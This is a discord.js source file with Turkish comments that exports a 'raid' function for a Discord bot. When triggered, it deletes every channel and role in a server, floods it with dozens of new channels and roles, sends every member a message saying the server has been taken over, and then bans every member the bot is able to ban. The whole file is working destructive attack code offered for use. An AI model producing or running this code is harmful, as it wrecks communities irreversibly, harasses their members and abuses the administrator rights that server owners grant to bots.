// DİKKAT: Bu dosya, çalıştığı sunucuda geri alınamaz hasara yol açan tehlikeli işlevler içerir.
// Sadece ne yaptığınızdan emin olduğunuzda kullanın.

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function executeRaid(message) {
    const guild = message.guild;
    const raidName = message.content.split(' ')[1] || 'raidlendi';
    const amount = parseInt(message.content.split(' ')[2]) || 50;
    const client = message.client;

    const socket = client.socket; // index.js'den socket.io'ya erişim için bir referans ekleyeceğiz.

    try {
        socket.emit('status-update', { message: `${guild.name} sunucusunda raid başladı!`, type: 'warning' });

        // 1. Tüm kanalları sil
        socket.emit('status-update', { message: 'Kanallar siliniyor...', type: 'info' });
        const channels = guild.channels.cache.values();
        for (const channel of channels) {
            await channel.delete().catch(() => {});
            await wait(250);
        }

        // 2. Tüm rolleri sil
        socket.emit('status-update', { message: 'Roller siliniyor...', type: 'info' });
        const roles = guild.roles.cache.values();
        for (const role of roles) {
            if (role.id !== guild.id && !role.managed) { // @everyone ve bot rollerini atla
                await role.delete().catch(() => {});
                await wait(250);
            }
        }
        
        // 3. Yeni kanallar oluştur
        socket.emit('status-update', { message: `${amount} adet yeni kanal oluşturuluyor...`, type: 'info' });
        for (let i = 0; i < amount; i++) {
            await guild.channels.create(raidName, { type: 0 }).catch(() => {}); // 0 = Text Channel
            await wait(250);
        }

        // 4. Yeni roller oluştur
        socket.emit('status-update', { message: `${amount} adet yeni rol oluşturuluyor...`, type: 'info' });
        for (let i = 0; i < amount; i++) {
            await guild.roles.create({ name: raidName, color: 'RANDOM' }).catch(() => {});
            await wait(250);
        }

        // 5. Herkese DM gönder (API limitleri nedeniyle yavaş ve riskli olabilir)
        socket.emit('status-update', { message: 'Tüm üyelere DM gönderilmeye çalışılıyor...', type: 'info' });
        const members = await guild.members.fetch();
        for (const member of members.values()) {
            if (member.id !== client.user.id && !member.user.bot) {
                await member.send(`Bu sunucu ${raidName} tarafından ele geçirildi.`).catch(() => {});
                await wait(1000); // Rate limit'e takılmamak için yavaş gönder
            }
        }

        // 6. Herkesi banla
        socket.emit('status-update', { message: 'Tüm üyeler yasaklanıyor...', type: 'warning' });
        for (const member of members.values()) {
            if (member.bannable) {
                await member.ban({ reason: raidName }).catch(() => {});
                await wait(250);
            }
        }

        socket.emit('status-update', { message: 'Raid tamamlandı!', type: 'success' });

    } catch (error) {
        console.error('Raid sırasında hata:', error);
        socket.emit('status-update', { message: `Raid başarısız oldu: ${error.message}`, type: 'error' });
    }
}

module.exports = executeRaid;
